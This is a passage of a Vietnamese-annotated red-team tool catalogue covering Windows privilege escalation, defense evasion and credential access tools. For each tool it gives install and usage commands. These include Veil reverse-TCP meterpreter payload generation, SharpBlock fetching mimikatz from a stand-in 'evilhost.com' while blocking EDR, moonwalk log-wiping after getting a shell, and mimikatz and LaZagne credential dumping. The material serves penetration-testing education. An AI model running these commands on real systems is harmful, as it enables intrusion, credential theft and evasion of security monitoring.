**Lưu ý:** Chạy tệp thực thi **Watson.exe**. Nó sẽ tự động kiểm tra hệ thống **Windows** (bản vá đã cài đặt, phiên bản hệ điều hành,...) và so sánh với danh sách các lỗ hổng **nâng quyền cục bộ** đã biết để báo cáo những lỗ hổng có khả năng tồn tại cùng với thông tin về các exploit liên quan.

![image](https://user-images.githubusercontent.com/100603074/210182370-409be1ac-64f9-4a07-96bd-b0752d7609a2.png)

*Văn bản hình ảnh được sử dụng từ https://github.com/rasta-mouse/Watson#usage*

### [🔙](#tool-list)[**ImpulsiveDLLHijack**](https://github.com/knight0x07/ImpulsiveDLLHijack)

A **C# based tool** that automates the process of discovering and exploiting **DLL Hijack**s in target binaries.

The discovered Hijacked paths can be weaponized, during an engagement, to evade EDR's.

**Install:**

- **Procmon.exe** -> https://docs.microsoft.com/en-us/sysinternals/downloads/procmon
- **Custom Confirmatory DLL's** :
	- These are DLL files which assist the tool to get the confirmation whether the DLL's are been successfully loaded from the identified hijack path
	- Compiled from the MalDLL project provided above (or use the precompiled binaries if you trust me!)
	- 32Bit dll name should be: **maldll32.dll**
	- 64Bit dll name should be: **maldll64.dll**
	- Install NuGet Package:** **PeNet** -> https://www.nuget.org/packages/PeNet/ (Prereq while compiling the **ImpulsiveDLLHijack** project)

**Note: i & ii prerequisites should be placed in the ImpulsiveDLLHijacks.exe's directory itself.**

- **Build and Setup Information:**

	- **ImpulsiveDLLHijack**

		- Clone the repository in **Visual Studio**
		- Once project is loaded in **Visual Studio** go to "**Project**" --> "**Manage NuGet packages**" --> Browse for packages and install "**PeNet**" -> https://www.nuget.org/packages/PeNet/
		- Build the project!
		- The **ImpulsiveDLLHijack.exe** will be inside the bin directory.

	- **And for Confirmatory DLL's:**

		- Clone the repository in **Visual Studio**
		- Build the project with **x86** and **x64**
		- Rename **x86** release as **maldll32.dll** and **x64** release as **maldll64.dll**

	- **Setup:** Copy the Confirmatory DLL's (**maldll32** & **maldll64**) in the **ImpulsiveDLLHijack.exe** directory & then execute **ImpulsiveDLLHijack.exe** :))

*Install instructions from https://github.com/knight0x07/ImpulsiveDLLHijack#2-prerequisites*
**Lưu ý:** **ImpulsiveDLLHijack** là một công cụ phức tạp yêu cầu chuẩn bị các file phụ trợ (**Procmon**, các DLL xác nhận) và môi trường build **Visual Studio**. Mục đích của nó là tự động tìm kiếm các cơ hội **DLL Hijack** trong các chương trình khác, có thể được sử dụng để thực thi mã độc thông qua một ứng dụng đáng tin cậy, né tránh sự phát hiện.

**Cách sử dụng:**

```bash
# Help
ImpulsiveDLLHijack.exe -h

# Look for vulnerabilities in an executable
ImpulsiveDLLHijack.exe -path BINARY_PATH
```
**Lưu ý:** Sử dụng **ImpulsiveDLLHijack.exe** với cờ `-path` chỉ định đường dẫn đến tệp thực thi mà bạn muốn phân tích để tìm cơ hội **DLL Hijack**. Công cụ sẽ tự động chạy tệp này (hoặc mô phỏng) và theo dõi bằng **Procmon** để tìm các nỗ lực tải DLL bị thiếu hoặc có thể bị ghi đè.

Usage examples can be found [tại đây](https://github.com/knight0x07/ImpulsiveDLLHijack#4-examples).

![image](https://user-images.githubusercontent.com/100603074/210267803-cefee62b-f16d-4768-81d0-9001ef1a2b98.png)

*Hình ảnh được sử dụng từ https://github.com/knight0x07/ImpulsiveDLLHijack#4-examples*

### [🔙](#tool-list)[**ADFSDump**](https://github.com/mandiant/ADFSDump)

A C# tool to dump all sorts of goodies from **AD FS**.

Created by Doug Bienstock [@doughsec](https://twitter.com/doughsec) while at Mandiant FireEye.

This tool is designed to be run in conjunction with **ADFSpoof**. **ADFSDump** will output all of the information needed in order to generate security tokens using **ADFSpoof**.

**Requirements:**

- **ADFSDump** must be run under the user context of the **AD FS** service account. You can get this information by running a process listing on the **AD FS server** or from the output of the **Get-ADFSProperties cmdlet**. Only the **AD FS service account** has the permissions needed to access the configuration database. Not even a **DA** can access this.
- **ADFSDump** assumes that the service is configured to use the **Windows Internal Database (WID)**. Although it would be trivial to support an external SQL server, this feature does not exist right now.
- **ADFSDump** must be run locally on an **AD FS server**, NOT an **AD FS web application proxy**. The **WID** can only be accessed locally via a named pipe.
**Lưu ý:** Các yêu cầu và hạn chế quan trọng khi sử dụng **ADFSDump**. Nó chỉ hoạt động cục bộ trên **AD FS server** (không phải proxy), chỉ hỗ trợ **WID** (database nội bộ), và **quan trọng nhất** là phải chạy dưới tài khoản dịch vụ của **AD FS**, đây là tài khoản duy nhất có quyền truy cập database cấu hình nhạy cảm.

**Install (Biên dịch):**

**ADFSDump** was built against .NET 4.5 with Visual Studio 2017 Community Edition. Simply open up the project .sln, choose "**Release**", and **build**.
**Lưu ý:** Biên dịch mã nguồn **C#** bằng **Visual Studio**.

**Cách sử dụng (Cờ):**

```bash
# Domain Active Directory mục tiêu. Mặc định là domain hiện tại.
/domain:

# Domain Controller mục tiêu. Mặc định là DC hiện tại.
/server:

# Switch. Chuyển đổi để vô hiệu hóa việc xuất khóa DKM.
/nokey

# (tùy chọn) Chuỗi kết nối SQL nếu ADFS đang sử dụng MS SQL từ xa thay vì WID.
/database
```
**Lưu ý:** Mô tả các cờ dòng lệnh chính của **ADFSDump.exe**. Công cụ này xuất ra các bí mật cấu hình **AD FS** bao gồm khóa giải mã (**DKM key**) cần thiết để sử dụng cùng với **ADFSpoof**.

[Blog - Exploring the Golden SAML Attack Against ADFS](https://www.orangecyberdefense.com/global/blog/cloud/exploring-the-golden-saml-attack-against-adfs)

![image](https://user-images.githubusercontent.com/100603074/212204724-65da5505-3576-4e6d-91ab-989b96247182.png)

*Hình ảnh được sử dụng từ https://www.orangecyberdefense.com/global/blog/cloud/exploring-the-golden-saml-attack-against-adfs*

### [🔙](#tool-list)[**BeRoot**](https://github.com/AlessandroZ/BeRoot)

**BeRoot Project** is a **post exploitation tool** to check common misconfigurations to find a way to escalate our privilege.

The goal of **BeRoot** is to only output potential **privilege escalation opportunities** and not a endpoint configuration assessment.

This project works on **Windows, Linux** and **Mac OS**.

**Install (Linux):**

```bash
git clone https://github.com/AlessandroZ/BeRoot
cd BeRoot/Linux/
```
**Lưu ý:** Clone mã nguồn bằng **Git** và di chuyển vào thư mục con cho phiên bản **Linux**.

**Install (**Windows**):**

A pre-compiled version of **BeRoot** can be found [tại đây](https://github.com/AlessandroZ/BeRoot/releases).
**Lưu ý:** Tải file `.exe` đã biên dịch sẵn.

**Cách sử dụng:**

```bash
# Run BeRoot
python beroot.py

# Run BeRoot with user password (If you know the password use it, you could get more results)
python beroot.py --password super_strong_password
```
**Lưu ý:** Các ví dụ sử dụng **script Python beroot.py** (trong thư mục `Linux/`). `-m password` với tùy chọn `--password` cho phép kiểm tra các cơ hội nâng quyền cục bộ mà cần thông tin xác thực (ví dụ: các file cấu hình chỉ có thể đọc bởi người dùng đó). **BeRoot** tìm kiếm các cấu hình sai cục bộ phổ biến như quyền hạn không đúng, các tệp cấu hình nhạy cảm, các lỗ hổng phiên bản phần mềm,... để đề xuất các cách **nâng quyền**.

Further information can be found here for:

- [Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)
- [Windows](https://github.com/AlessandroZ/BeRoot/tree/master/Windows)

![image](https://github.com/A-poc/RedTeam-Tools/assets/100603074/4c84ffeb-1ffb-474a-b028-4c8fcc64deb6)

*Hình ảnh được sử dụng từ https://github.com/AlessandroZ/BeRoot*

**Defense Evasion**
====================

### [🔙](#tool-list)[**Invoke-Obfuscation**](https://github.com/danielbohannon/Invoke-Obfuscation)

A **PowerShell v2.0+** compatible **PowerShell command** and **script obfuscator**. If a victim endpoint is able to execute **PowerShell** then this tool is great for creating heavily obfuscated scripts.

**Install:**

```bash
git clone https://github.com/danielbohannon/Invoke-Obfuscation.git
```
**Lưu ý:** Tải mã nguồn **Invoke-Obfuscation** bằng **Git**. Đây là một script PowerShell và bộ module PowerShell, chạy trên **Windows** trong môi trường PowerShell.

**Cách sử dụng:**

```bash
./Invoke-Obfuscation
```
**Lưu ý:** Chạy **script Invoke-Obfuscation.psd1** hoặc **Invoke-Obfuscation.psm1** (hoặc script launcher chính) trong PowerShell. Thường cần import module này trước khi chạy các hàm của nó. Công cụ hoạt động ở chế độ tương tác, bạn cung cấp mã **PowerShell** cần che giấu và chọn các kỹ thuật che giấu từ menu.

![image](https://user-images.githubusercontent.com/100603074/206557377-a522ab7a-5803-48b0-8f3e-d7d7b607e692.png)

### [🔙](#tool-list)[**Veil**](https://github.com/Veil-Framework/Veil)

**Veil** is a tool for generating **metasploit payloads** that bypass common anti-virus solutions.

It can be used to generate obfuscated shellcode, see the official [**veil framework blog**](https://www.veil-framework.com/) for more info.

**Install (Kali):**

```bash
apt -y install veil
/usr/share/veil/config/setup.sh --force --silent
```
**Lưu ý:** Cài đặt **Veil** và chạy **script setup.sh** của nó trên **Kali Linux** bằng **apt**. **Script setup.sh** sẽ cài đặt các module và dependency cần thiết.

**Install (Git):**

```bash
sudo apt-get -y install git
git clone https://github.com/Veil-Framework/Veil.git
cd Veil/
./config/setup.sh --force --silent
```
**Lưu ý:** Cài đặt bằng **Git** trên **Linux**, sau đó chạy **script setup.sh** tương tự như trên **Kali**.

**Cách sử dụng:**

```bash
# Liệt kê tất cả payload (–list-payloads) cho công cụ Ordnance (-t Ordnance)
./Veil.py -t Ordnance --list-payloads

# Liệt kê tất cả encoder (–list-encoders) cho công cụ Ordnance (-t Ordnance)
./Veil.py -t Ordnance --list-encoders

# Generate a reverse tcp payload which connects back to the ip 192.168.1.20 on port 1234
./Veil.py -t Ordnance --ordnance-payload rev_tcp --ip 192.168.1.20 --port 1234

# Liệt kê tất cả payload (–list-payloads) cho công cụ Evasion (-t Evasion)
./Veil.py -t Evasion --list-payloads

# Generate shellcode using Evasion, payload number 41, reverse_tcp to 192.168.1.4 on port 8676, output file chris
./Veil.py -t Evasion -p 41 --msfvenom windows/meterpreter/reverse_tcp --ip 192.168.1.4 --port 8676 -o chris
```
**Lưu ý:** **Veil.py** là script chính để chạy. `-t` chỉ định toolkit (`Ordnance` hoặc `Evasion`). Các cờ như `--list-payloads`, `--list-encoders`, `--ordnance-payload`, `--msfvenom` được dùng để liệt kê hoặc chọn/cấu hình **payload/encoder**. `-o` chỉ định tên file output. Công cụ này chạy trên **Linux** (hoặc hệ thống **attacker**) để tạo các **payload** đã bị che giấu.

**Veil** creators wrote a nice [blog post](https://www.veil-framework.com/veil-command-line-usage/) explaining further ordnance and evasion command line usage.

![image](https://user-images.githubusercontent.com/100603074/210136422-6b17671f-8868-4747-a7fe-e75d36b99e61.png)

### [🔙](#tool-list)[**SharpBlock**](https://github.com/CCob/SharpBlock)

A method of bypassing EDR's active projection DLL's by preventing entry point execution.

**Tính năng:**

- Blocks EDR DLL entry point execution, which prevents EDR hooks from being placed.
- Patchless AMSI bypass that is undetectable from scanners looking for Amsi.dll code patches at runtime.
- Host process that is replaced with an implant PE that can be loaded from disk, HTTP or named pipe (Cobalt Strike).
- Implanted process is hidden to help evade scanners looking for hollowed processes.
- Command line args are spoofed and implanted after process creation using stealthy EDR detection method.
- Patchless ETW bypass.
- Blocks NtProtectVirtualMemory invocation when callee is within the range of a blocked DLL's address space.

**Install:**

Use [Visual Studio 2019 Community Edition](https://visualstudio.microsoft.com/vs/community/) to compile the **SharpBlock** binary.

Open the **SharpBlock** [project .sln](https://github.com/CCob/SharpBlock), choose "**Release**", and **build**.
**Lưu ý:** Biên dịch mã nguồn C# bằng **Visual Studio**.

**Cách sử dụng:**

```bash
# Launch mimikatz over HTTP using notepad as the host process, blocking SylantStrike's DLL
SharpBlock -e http://evilhost.com/mimikatz.bin -s c:\windows\system32\notepad.exe -d "Active Protection DLL for SylantStrike" -a coffee

# Launch mimikatz using Cobalt Strike beacon over named pipe using notepad as the host process, blocking SylantStrike's DLL
execute-assembly SharpBlock.exe -e \\.\pipe\mimi -s c:\windows\system32\notepad.exe -d "Active Protection DLL for SylantStrike" -a coffee
upload_file /home/haxor/mimikatz.exe \\.\pipe\mimi
```
**Lưu ý:** **SharpBlock** là một **loader** thực thi mã (`-e` để chỉ định nguồn shellcode hoặc binary), nó cố gắng inject/host payload vào một tiến trình hợp pháp đã có (`-s`, ở đây là notepad.exe) để trông giống tiến trình bình thường. `-d` chỉ định tên của DLL **EDR** cần né tránh, và công cụ này áp dụng kỹ thuật để block hook của **EDR** trong tiến trình đó. `execute-assembly` là một lệnh trong **Cobalt Strike** để chạy một assembly .NET trong bộ nhớ của **beacon**. Kỹ thuật này nhằm né tránh các **EDR** cụ thể và giám sát tiến trình/bộ nhớ. Chạy trên **Windows**.

Nice PenTestPartners blog post [tại đây](https://www.pentestpartners.com/security-blog/patchless-amsi-bypass-using-sharpblock/).

![image](https://user-images.githubusercontent.com/100603074/210983524-d6ea4255-7c47-45bb-8b13-9f6240735b0e.png)

*Hình ảnh được sử dụng từ https://youtu.be/0W9wkamknfM*

### [🔙](#tool-list)[**Alcatraz**](https://github.com/weak1337/Alcatraz)

**Alcatraz** is a GUI **x64 binary obfuscator** that is able to obfuscate various different pe files including:

- **.exe**
- **.dll**
- **.sys**

Some supported obfuscation features include:

- Obfuscation of immediate moves
- Control flow flattening
- ADD mutation
- Entry-point obfuscation
- Lea obfuscation

**Install (Requirements):**

Install: https://vcpkg.io/en/getting-started.html

```bash
vcpkg.exe install asmjit:x64-windows
vcpkg.exe install zydis:x64-windows
```
**Lưu ý:** **Alcatraz** là một công cụ dựa trên **Windows** (vì nó thao tác tệp PE của **Windows**), yêu cầu môi trường build/dependency cụ thể như **vcpkg** để cài đặt các thư viện phát triển cần thiết như **asmjit** và **zydis**.

**Cách sử dụng:**

Using the GUI to obfuscate a binary:

1. Load a binary by clicking `file` in the top left corner.
2. Add functions by expanding the `Functions` tree. (You can search by putting in the name in the searchbar at the top)
3. Hit `compile` (**Note:** *Obfuscating lots of functions might take some seconds*)
**Lưu ý:** Alcatraz là một công cụ có giao diện người dùng đồ họa (GUI) để thực hiện việc che giấu tệp nhị phân.

![image](https://user-images.githubusercontent.com/100603074/211530410-12982326-8fff-4415-bdde-2ebf6db2ae6c.png)

*Hình ảnh được sử dụng từ https://github.com/weak1337/Alcatraz*

### [🔙](#tool-list)[**Mangle**](https://github.com/optiv/Mangle)

**Mangle** is a tool that manipulates aspects of compiled executables (**.exe** or **DLL**).

**Mangle** can remove known Indicators of Compromise (IoC) based strings and replace them with random characters, change the file by inflating the size to avoid **EDRs**, and can clone **code-signing certs** from legitimate files.

In doing so, **Mangle** helps loaders evade on-disk and in-memory scanners.

**Install:**

The first step, as always, is to clone the repo. Before you compile **Mangle**, you'll need to install the dependencies. To install them, run the following commands:

```
go get github.com/Binject/debug/pe
```
**Lưu ý:** Tải dependency **Golang** cần thiết để thao tác tệp PE. Yêu cầu môi trường Go.

Then build it

```
git clone https://github.com/optiv/Mangle
cd Mangle
go build Mangle.go
```
**Lưu ý:** Clone mã nguồn **Mangle** bằng **Git** và biên dịch file thực thi bằng **Go**.

**Cách sử dụng:**

```
Usage of ./ScareCrow:
  -C string
        Path to the file containing the certificate you want to clone
  -I string
        Path to the orginal file
  -M    Edit the PE file to strip out Go indicators
  -O string
        The new file name
  -S int
        How many MBs to increase the file by
```
**Lưu ý:** Output help cho công cụ này. Các tham số dòng lệnh chính bao gồm: `-C` để chỉ định chứng chỉ cần sao chép (kỹ thuật **code-signing clone**), `-I` tệp input, `-M` để loại bỏ dấu hiệu Go trong tệp nhị phân được biên dịch bằng Go, `-O` tên file output, `-S` để tăng kích thước file (kỹ thuật né tránh heuristic dựa trên kích thước). **Mangle** là một công cụ manipulation binary.

Full usage information can be found [tại đây](https://github.com/optiv/Mangle#usage).

![image](https://user-images.githubusercontent.com/100603074/216736894-ce46ac43-52b8-42bd-9f03-5d7656a635ff.png)

*Hình ảnh được sử dụng từ https://github.com/optiv/Mangle*

### [🔙](#tool-list)[**AMSI Fail**](http://amsi.fail/)

**AMSI.fail** is a great website that can be used to generate obfuscated **PowerShell snippets** that break or disable **AMSI** for the current process.

The snippets are randomly selected from a small pool of techniques/variations before being obfuscated. Every snippet is obfuscated at runtime/request so that no generated output share the same signatures.

Nice f-secure blog explaining **AMSI** [tại đây](https://blog.f-secure.com/hunting-for-amsi-bypasses/).
**Lưu ý:** **AMSI (Antimalware Scan Interface)** là một interface trong **Windows** cho phép các ứng dụng và dịch vụ (bao gồm **PowerShell**) truyền dữ liệu đến các **anti-malware provider** trên hệ thống để quét. Các kỹ thuật bypass **AMSI** cố gắng làm cho interface này ngừng hoạt động hoặc không truyền đúng dữ liệu độc hại. Trang web **amsi.fail** cung cấp các đoạn code **PowerShell** được tạo ngẫu nhiên để thử né tránh **AMSI**, mỗi lần refresh lại là một đoạn code khác nhau.

![image](https://user-images.githubusercontent.com/100603074/217655078-919e9c98-4c78-4c2b-a695-3e1c4d3f1e65.png)

*Hình ảnh được sử dụng từ http://amsi.fail/*

### [🔙](#tool-list)[**ScareCrow**](https://github.com/optiv/ScareCrow)

**ScareCrow** is a **payload creation framework** for side loading (not injecting) into a legitimate **Windows process** (bypassing **Application Whitelisting** controls).

Once the **DLL loader** is loaded into memory, it utilizes a technique to flush an EDR’s hook out of the system DLLs running in the process's memory.

When executed, **ScareCrow** will copy the bytes of the system DLLs stored on disk in `C:\Windows\System32\`. These DLLs are stored on disk “clean” of EDR hooks because they are used by the system to load an unaltered copy into a new process when it’s spawned. Since EDR’s only hook these processes in memory, they remain unaltered.

Nice blogs for learning about techniques utilized by **ScareCrow**:

- [Endpoint Detection and Response: How Hackers Have Evolved](https://www.optiv.com/explore-optiv-insights/source-zero/endpoint-detection-and-response-how-hackers-have-evolved)
- [EDR and Blending In: How Attackers Avoid Getting Caught](https://www.optiv.com/explore-optiv-insights/source-zero/edr-and-blending-how-attackers-avoid-getting-caught)

**Install:**

*ScareCrow requires **golang 1.16.1** or later to compile loaders.*

```bash
# Clone
git clone https://github.com/optiv/ScareCrow
cd ScareCrow

# Install dependencies
go get github.com/fatih/color
go get github.com/yeka/zip
go get github.com/josephspurrier/goversioninfo

# Required
openssl
osslsigncode
mingw-w64

# Build
go build ScareCrow.go
```
**Lưu ý:** Hướng dẫn cài đặt và build công cụ bằng **Golang** trên hệ thống **attacker**. Nó yêu cầu **Git**, môi trường Go, **OpenSSL**, **osslsigncode** và **mingw-w64** để biên dịch các thành phần cần thiết, đặc biệt là để ký mã cho các loader (làm cho chúng trông đáng tin cậy hơn).

**Cách sử dụng:**

```
Usage of ./ScareCrow:
  -I string
        Đường dẫn đến shellcode raw 64-bit.
  -Loader string
        Đặt loại tiến trình sẽ sideload payload độc hại:
        [*] binary - Tạo payload dựa trên binary. (Loại này không tận dụng lợi ích của sideloading)
        [*] control - Load applet control ẩn - tên tiến trình sẽ là rundll32 if -O is specified a JScript loader will be generated.
        [*] dll - Chỉ tạo một tệp DLL. Can be executed with commands such as rundll32 or regsvr32 with DllRegisterServer, DllGetClassObject as export functions.
        [*] excel - Load vào tiến trình Excel ẩn sử dụng loader JScript.
        [*] msiexec - Load vào tiến trình MSIexec sử dụng loader JScript.
        [*] wscript - Load vào tiến trình WScript process using a JScript loader. (default "binary")
  -O string
        Tên tệp đầu ra (e.g. loader.js or loader.hta). If Loader is set to dll or binary this option is not required.
  -configfile string
        The path to a json based configuration file to generate custom file attributes. This will not use the default ones.
  -console
        Only for Binary Payloads - Generates verbose console information when the payload is executed. This will disable the hidden window feature.
...
```
**Lưu ý:** **Output help** của **ScareCrow**. Nó là một **framework** tạo loader/payload tiên tiến với nhiều tùy chọn né tránh. `-I` chỉ định shellcode input. `-Loader` chọn loại loader sẽ tạo (file thực thi, DLL, JScript, HTA,...), ảnh hưởng đến tiến trình **Windows** đích. `-O` đặt tên file output. Tool này kết hợp các kỹ thuật để né tránh **Application Whitelisting** và các **hook EDR** bằng cách sideload mã độc vào tiến trình hệ thống và flush hook **EDR**.

Full usage information can be found [tại đây](https://github.com/optiv/ScareCrow#loader).

![image](https://user-images.githubusercontent.com/100603074/220959052-029eac69-0b38-40d5-bc1a-7e90b0c93726.png)

*Hình ảnh được sử dụng từ https://github.com/optiv/ScareCrow*

### [🔙](#tool-list)[**moonwalk**](https://github.com/mufeedvh/moonwalk)

**moonwalk** is a 400 KB single-binary executable that can clear your traces while **penetration testing** a **Unix** machine.

It saves the state of system logs pre-exploitation and reverts that state including the filesystem timestamps post-exploitation leaving zero traces of a ghost in the shell.

**Install:**

```bash
curl -L https://github.com/mufeedvh/moonwalk/releases/download/v1.0.0/moonwalk_linux -o moonwalk
```
**Lưu ý:** Tải xuống file binary của **moonwalk** cho **Linux** và lưu dưới tên `moonwalk`. Phương pháp tiện lợi trên hệ thống **Linux** đã bị xâm nhập.

**Cách sử dụng:**

```bash
# Bắt đầu moonwalk straight after getting a shell on the victim Linux endpoint
curl -L https://github.com/mufeedvh/moonwalk/releases/download/v1.0.0/moonwalk_linux -o moonwalk
chmod +x moonwalk
moonwalk start

# Once you are finished, clear your traces
moonwalk finish
```
**Lưu ý:** Bạn cần cấp quyền thực thi cho file **moonwalk** đã tải về (`chmod +x moonwalk`). Sau đó chạy nó với lệnh `start` khi bạn bắt đầu các hoạt động có thể để lại dấu vết (ví dụ: chỉnh sửa file cấu hình, thực thi lệnh). Khi hoàn thành, chạy `moonwalk finish` để **moonwalk** cố gắng khôi phục các file/dấu thời gian đã được lưu trữ ban đầu, xóa dấu vết của bạn. Rất hữu ích cho **anti-forensics** trên **Linux**.

![image](https://user-images.githubusercontent.com/100603074/220959174-9c72922f-40cc-4843-bdc8-353cc55a3c51.png)

*Hình ảnh được sử dụng từ https://github.com/mufeedvh/moonwalk*

**Credential Access**
====================

### [🔙](#tool-list)[**Mimikatz**](https://github.com/gentilkiwi/mimikatz)

Great tool for gaining access to hashed and cleartext passwords on a victims endpoint. Once you have gained **privileged access** to a system, drop this tool to collect some creds.

**Install:**

1. Download the [mimikatz_trunk.7z](https://github.com/gentilkiwi/mimikatz/releases) file.
2. Once downloaded, the `mimikatz.exe` binary is in the `x64` folder.
**Lưu ý:** Tải xuống tệp nén chứa file nhị phân **Mimikatz.exe**. Đây là công cụ chạy trên **Windows**, phiên bản x64 nằm trong thư mục `x64`. **Mimikatz** là một trong những công cụ mạnh nhất để lấy thông tin xác thực trên hệ thống **Windows**, bao gồm mật khẩu dạng văn bản rõ, hash **NTLM**, vé **Kerberos**,...

**Cách sử dụng:**

```bash
.\mimikatz.exe
privilege::debug
```
**Lưu ý:**
`.\mimikatz.exe`: Chạy tệp thực thi **Mimikatz**. Công cụ hoạt động ở chế độ tương tác theo dòng lệnh của riêng nó.
`privilege::debug`: Lệnh trong **Mimikatz** để thiết lập đặc quyền `SeDebugPrivilege` cho tiến trình **Mimikatz** hiện tại. Đặc quyền này thường cần thiết để truy cập và dump bộ nhớ của các tiến trình hệ thống nhạy cảm như **LSASS**. Yêu cầu chạy **Mimikatz** với quyền **quản trị** viên để có thể thiết lập đặc quyền này. Sau đó, bạn có thể chạy các module khác như `sekurlsa::logonpasswords` để **dump** thông tin xác thực.

![image](https://user-images.githubusercontent.com/100603074/208253562-5c58d412-ed3e-4ab5-b8e7-11092852c3d0.png)

### [🔙](#tool-list)[**LaZagne**](https://github.com/AlessandroZ/LaZagne)

Nice tool for extracting locally stored passwords from browsers, databases, games, mail, git, wifi, etc.

**Install (Binary):**

You can install the standalone binary from [tại đây](https://github.com/AlessandroZ/LaZagne/releases/).
**Lưu ý:** Tải xuống file `.exe` đã biên dịch sẵn. **LaZagne** là công cụ chạy trên **Windows**.

**Cách sử dụng:**

```bash
# Launch all modes
.\laZagne.exe all

# Launch only a specific module
.\laZagne.exe browsers

# Launch only a specific software script
.\laZagne.exe browsers -firefox
```
**Lưu ý:** Các ví dụ sử dụng **LaZagne.exe** với các đối số khác nhau. `all` cố gắng trích xuất mật khẩu từ tất cả các ứng dụng và dịch vụ mà nó hỗ trợ. Bạn cũng có thể chỉ định một module cụ thể (`browsers`) hoặc thậm chí là một ứng dụng cụ thể trong module đó (`-firefox`). Công cụ này chạy trên hệ thống mục tiêu để tìm và giải mã mật khẩu được lưu trữ bởi các ứng dụng thông thường.

![image](https://user-images.githubusercontent.com/100603074/208253800-48f960db-d569-4d1a-b39f-d6c7643691e2.png)

### [🔙](#tool-list)[**hashcat**](https://github.com/hashcat/hashcat)

Tool for cracking **password hash**es. Supports a large list of hashing algorithms (Full list can be found [tại đây](https://hashcat.net/wiki/doku.php?id=example_hashes)).

**Install: Binary**

You can install the standalone binary from [tại đây](https://hashcat.net/hashcat/).
**Lưu ý:** Tải xuống file binary cho hệ điều hành của bạn. **Hashcat** là công cụ phổ biến và mạnh mẽ để crack hash mật khẩu, sử dụng tài nguyên **CPU** và **GPU**.

**Cách sử dụng:**

```bash
.\hashcat.exe --help
```
**Lưu ý:** Lệnh hiển thị màn hình trợ giúp, rất chi tiết do **hashcat** hỗ trợ nhiều chế độ tấn công (brute force, dictionary, hybrid, mask,...) và hàng trăm loại hash (chế độ -m). Bạn cần cung cấp file hash cần crack và phương thức tấn công (wordlist, rule, mask,...).

Nice **hashcat** command [cheatsheet](https://cheatsheet.haax.fr/passcracking-hashfiles/hashcat_cheatsheet/).

![image](https://user-images.githubusercontent.com/100603074/208263419-94bf92c0-1c83-4366-a6c2-b6533fdcc521.png)

### [🔙](#tool-list)[**John the Ripper**](https://github.com/openwall/john)

Another password cracker, which supports hundreds of hash and cipher types, and runs on many operating systems, CPUs and GPUs.

**Install:**

```bash
sudo apt-get install john -y
```
**Lưu ý:** Cài đặt **John the Ripper** trên **Linux/Debian/Ubuntu** bằng **apt**.

**Cách sử dụng:**

```bash
john
```
**Lưu ý:** Chạy công cụ **John the Ripper**. Nó cũng là một công cụ crack mật khẩu, thường được sử dụng từ dòng lệnh hoặc ở chế độ tương tác. Giống như **hashcat**, bạn cần cung cấp file hash và phương thức tấn công.

![image](https://user-images.githubusercontent.com/100603074/208263690-8c2d1253-7261-47da-850d-ca5a8d98ca13.png)

### [🔙](#tool-list)[**SCOMDecrypt**](https://github.com/nccgroup/SCOMDecrypt)

Công cụ này được thiết kế để truy xuất và giải mã thông tin xác thực **RunAs** được lưu trữ trong các cơ sở dữ liệu **Microsoft System Center Operations Manager (SCOM)**.

NCC blog post - ['SCOMplicated? – Decrypting SCOM “RunAs” credentials'](https://research.nccgroup.com/2017/02/23/scomplicated-decrypting-scom-runas-credentials/)

**Điều kiện tiên quyết:**

To run the tool you will require administrative privileges on the **SCOM server**. You will also need to ensure that you have read access to the following registry key:

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\System Center\2010\Common\MOMBins
```

You can check manually that you can see the database by gathering the connection details from the following keys:

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\System Center\2010\Common\Database\DatabaseServerName
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\System Center\2010\Common\Database\DatabaseName
```
**Lưu ý:** **Điều kiện tiên quyết** quan trọng nhất là **phải có quyền quản trị trên SCOM server** và có thể đọc các khóa registry này. Thông tin xác thực **RunAs** trong **SCOM** được lưu trữ đã mã hóa, và khóa giải mã được lưu trong registry.

**Install (PS1):**

```
git clone https://github.com/nccgroup/SCOMDecrypt
cd .\SCOMDecrypt\SCOMDecrypt\
. .\Invoke-SCOMDecrypt.ps1
```
**Lưu ý:** Tải mã nguồn script **PowerShell**, di chuyển vào thư mục và chạy script **`Invoke-SCOMDecrypt.ps1`** bằng cách sử dụng cú pháp `.` để source script, làm cho các hàm của nó có sẵn trong phiên PowerShell hiện tại.

**Install (Biên dịch):**

Using [Visual Studio 2019 Community Edition](https://visualstudio.microsoft.com/vs/community/) you can compile the **SCOMDecrypt** binary.

Open the **SCOMDecrypt** [project .sln](https://github.com/nccgroup/SCOMDecrypt), choose "**Release**", and **build**.
**Lưu ý:** Biên dịch từ mã nguồn **C#** bằng **Visual Studio** để tạo file thực thi.

**Cách sử dụng:**

```bash
# PS1
Invoke-SCOMDecrypt

# Compiled C# binary
.\SCOMDecrypt.exe
```
**Lưu ý:** Chạy hàm `Invoke-SCOMDecrypt` (nếu đã import script) hoặc tệp thực thi **SCOMDecrypt.exe**. Công cụ này tự động đọc khóa giải mã từ registry và kết nối tới database **SCOM** để trích xuất và giải mã thông tin xác thực **RunAs** (thường là tài khoản có quyền cao được cấu hình để chạy các tác vụ tự động trong **SCOM**). Chạy trên **SCOM server** với quyền quản trị.

*Văn bản hình ảnh được sử dụng từ https://github.com/nccgroup/SCOMDecrypt*

### [🔙](#tool-list)[**nanodump**](https://github.com/helpsystems/nanodump)

The **LSASS** (Local Security Authority Subsystem Service) is a system process in the **Windows** operating system that is responsible for enforcing the security policy on the system. It is responsible for a number of tasks related to security, including authenticating users for logon, enforcing security policies, and generating audit logs.

Creating a **dump** of this process can allow an attacker to extract password hashes or other sensitive information from the process's memory, which could be used to compromise the system further.

This allows for the creation of a **minidump** of the **LSASS process**.

**Install:**

```bash
git clone https://github.com/helpsystems/nanodump.git
```
**Lưu ý:** Tải mã nguồn. Công cụ này được viết bằng **C**.

**Install (Linux with MinGW):**

```bash
make -f Makefile.mingw
```
**Lưu ý:** Biên dịch mã nguồn C bằng **`make`** với **Makefile.mingw** trên hệ thống **Linux** sử dụng **MinGW** cross-compiler, cho phép tạo tệp thực thi cho **Windows** từ môi trường **Linux**.

**Install (**Windows** with MSVC):**

```bash
nmake -f Makefile.msvc
```
**Lưu ý:** Biên dịch mã nguồn C bằng **`nmake`** với **Makefile.msvc** trong môi trường phát triển **Visual Studio** trên **Windows**.

**Install (CobaltStrike only):**

Import the `NanoDump.cna` script on **Cobalt Strike**.
